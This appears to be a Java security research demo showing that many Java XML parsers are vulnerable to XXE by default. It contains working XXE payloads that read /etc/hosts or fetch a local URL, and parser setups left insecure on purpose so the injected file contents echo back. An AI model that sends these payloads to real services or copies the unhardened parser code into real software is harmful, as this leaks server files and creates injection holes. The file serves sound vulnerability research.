package org.example;


import java.io.ByteArrayInputStream;

/**
 * @author Whoopsunix
 *
 * XXE 有回显 Demo
 */
public class XXEDemo {

    public static void main(String[] args) throws Exception {
        String filePayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>";
        String httpPayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:1234/flag.txt\">]><foo>&xxe;</foo>";
        String result = null;

//        result = xmlReader(httpPayload);
//        result = jdomSAXBuilder(filePayload);
//        result = jdom2SAXBuilder(filePayload);
//        result = javaxSAXParser(httpPayload);
//        result = dom4jSAXReader(filePayload);
        result = jaxpSAXParserFactoryImpl(filePayload);
//        result = xercesSAXParser(filePayload);
//        result = javaxDocumentBuilder(httpPayload);
//        result = jaxpDocumentBuilderImpl(httpPayload);
//        result = jaxpDocumentBuilderFactoryImpl(httpPayload);
//        result = jaxpXercesDocumentBuilderFactoryImpl(httpPayload);
//        result = dom4jDocumentHelper(httpPayload);
//        result = javaxXMLInputFactory(filePayload);

        // test


        System.out.println(result);

    }

    /**
     * org.xml.sax.XMLReader
     * filePayload、httpPayload
     */
    public static String xmlReader(String xml) throws Exception {
        org.xml.sax.XMLReader xmlReader = org.xml.sax.helpers.XMLReaderFactory.createXMLReader();
        // 使用 ByteArrayInputStream 将字符串转换为输入流
        ByteArrayInputStream inputStream = new ByteArrayInputStream(xml.getBytes());

        // 使用 InputSource 包装输入流
        org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource(inputStream);

        // 注册事件处理程序
        CustomHandler handler = new CustomHandler();
        xmlReader.setContentHandler(handler);

        // 解析 XML
        xmlReader.parse(inputSource);


        // 获取解析的结果
        String result = handler.getResult();
        return result;
//        xmlReader.parse(new InputSource(new ByteArrayInputStream(xml.getBytes())));
    }


    /**
     * org.jdom.input.SAXBuilder
     * filePayload、httpPayload
     */
    public static String jdomSAXBuilder(String xml) throws Exception {
        org.jdom.input.SAXBuilder saxBuilder = new org.jdom.input.SAXBuilder();

        org.jdom.Document document = saxBuilder.build(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        // 获取根元素
        org.jdom.Element rootElement = document.getRootElement();

        // 输出结果
        return rootElement.getText();
    }

    /**
     * org.jdom2.input.SAXBuilder
     * filePayload、httpPayload
     */
    public static String jdom2SAXBuilder(String xml) throws Exception {
        org.jdom2.input.SAXBuilder saxBuilder = new org.jdom2.input.SAXBuilder();

        org.jdom2.Document document = saxBuilder.build(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        // 获取根元素
        org.jdom2.Element rootElement = document.getRootElement();

        // 输出结果
        return rootElement.getText();
    }

    /**
     * javax.xml.parsers.SAXParser
     * filePayload、httpPayload
     */
    public static String javaxSAXParser(String xml) throws Exception {
        javax.xml.parsers.SAXParser saxParser = javax.xml.parsers.SAXParserFactory.newInstance().newSAXParser();
        org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes()));
        CustomHandler handler = new CustomHandler();
        saxParser.parse(inputSource, handler);
        String result = handler.getResult();
        return result;
    }

    /**
     * javax.xml.parsers.DocumentBuilder
     * filePayload、httpPayload
     */
    public static String javaxDocumentBuilder(String xml) throws Exception {
        javax.xml.parsers.DocumentBuilder documentBuilder = javax.xml.parsers.DocumentBuilderFactory.newInstance().newDocumentBuilder();
        org.w3c.dom.Document document = documentBuilder.parse(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        String result = document.getDocumentElement().getTextContent();
        return result;
    }

    /**
     * javax.xml.stream.XMLInputFactory
     * filePayload、httpPayload
     */
    public static String javaxXMLInputFactory(String xml) throws Exception {
        javax.xml.stream.XMLInputFactory xmlInputFactory = javax.xml.stream.XMLInputFactory.newFactory();
        javax.xml.stream.XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(new ByteArrayInputStream(xml.getBytes()));
        StringBuilder result = new StringBuilder();

        while (xmlStreamReader.hasNext()) {
            int event = xmlStreamReader.next();

            switch (event) {
                case javax.xml.stream.XMLStreamConstants.START_ELEMENT:
                    result.append("<").append(xmlStreamReader.getLocalName()).append(">");
                    break;
                case javax.xml.stream.XMLStreamConstants.CHARACTERS:
                    result.append(xmlStreamReader.getText());
                    break;
                case javax.xml.stream.XMLStreamConstants.END_ELEMENT:
                    result.append("</").append(xmlStreamReader.getLocalName()).append(">");
                    break;
                // Handle other events as needed
            }
        }

        return result.toString();
    }

    /**
     * org.dom4j.io.SAXReader
     * filePayload、httpPayload
     */
    public static String dom4jSAXReader(String xml) throws Exception {
        org.dom4j.io.SAXReader saxReader = new org.dom4j.io.SAXReader();
        org.dom4j.Document document = saxReader.read(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        // 获取根元素
        org.dom4j.Element rootElement = document.getRootElement();

        return rootElement.getText();
    }

    /**
     * org.dom4j.DocumentHelper 2.1.1以上被修复，且必须要有ENTITY才能利用
     * filePayload、httpPayload
     */
    public static String dom4jDocumentHelper(String xml) throws Exception {
        org.dom4j.Document document = org.dom4j.DocumentHelper.parseText(xml);
        org.dom4j.Element rootElement = document.getRootElement();
        String childValue = rootElement.getText();
        return childValue;
    }

    /**
     * org.apache.xerces.jaxp.SAXParserFactoryImpl
     * filePayload、httpPayload
     */
    public static String jaxpSAXParserFactoryImpl(String xml) throws Exception {
        org.apache.xerces.jaxp.SAXParserFactoryImpl saxParserFactory = (org.apache.xerces.jaxp.SAXParserFactoryImpl) javax.xml.parsers.SAXParserFactory.newInstance();
        org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes()));
        CustomHandler handler = new CustomHandler();
        saxParserFactory.newSAXParser().parse(inputSource, handler);
        String result = handler.getResult();
        return result;
    }

    /**
     * org.apache.xerces.jaxp.DocumentBuilderImpl
     * filePayload、httpPayload
     */
    public static String jaxpDocumentBuilderImpl(String xml) throws Exception {
        org.apache.xerces.jaxp.DocumentBuilderImpl documentBuilder = (org.apache.xerces.jaxp.DocumentBuilderImpl) javax.xml.parsers.DocumentBuilderFactory.newInstance().newDocumentBuilder();
        org.w3c.dom.Document document = documentBuilder.parse(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        String result = document.getDocumentElement().getTextContent();
        return result;
    }

    /**
     * org.apache.xerces.jaxp.DocumentBuilderFactoryImpl
     * filePayload、httpPayload
     */
    public static String jaxpDocumentBuilderFactoryImpl(String xml) throws Exception {
        org.apache.xerces.jaxp.DocumentBuilderFactoryImpl documentBuilderFactory = (org.apache.xerces.jaxp.DocumentBuilderFactoryImpl) javax.xml.parsers.DocumentBuilderFactory.newInstance();
        org.w3c.dom.Document document = documentBuilderFactory.newDocumentBuilder().parse(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        String result = document.getDocumentElement().getTextContent();
        return result;
    }

    /**
     * com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl
     * filePayload、httpPayload
     */
    public static String jaxpXercesDocumentBuilderFactoryImpl(String xml) throws Exception {
        com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl documentBuilderFactory = new com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl();
        javax.xml.parsers.DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
        org.w3c.dom.Document document = documentBuilder.parse(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));
        String result = document.getDocumentElement().getTextContent();
        return result;
    }

    /**
     * org.apache.xerces.parsers.SAXParser
     * filePayload、httpPayload
     */
    public static String xercesSAXParser(String xml) throws Exception {
        org.apache.xerces.parsers.SAXParser saxParser = new org.apache.xerces.parsers.SAXParser();
        CustomHandler customHandler = new CustomHandler();
        saxParser.setContentHandler(customHandler);
        saxParser.parse(new org.xml.sax.InputSource(new ByteArrayInputStream(xml.getBytes())));

        return customHandler.getResult();
    }

    static class CustomHandler extends org.xml.sax.helpers.DefaultHandler {

        private StringBuilder resultBuilder = new StringBuilder();

        @Override
        public void characters(char[] ch, int start, int length) throws org.xml.sax.SAXException {
            // 处理文本内容事件
            String content = new String(ch, start, length);
            resultBuilder.append(content);
        }

        // 获取解析的结果
        public String getResult() {
            return resultBuilder.toString();
        }
    }
}
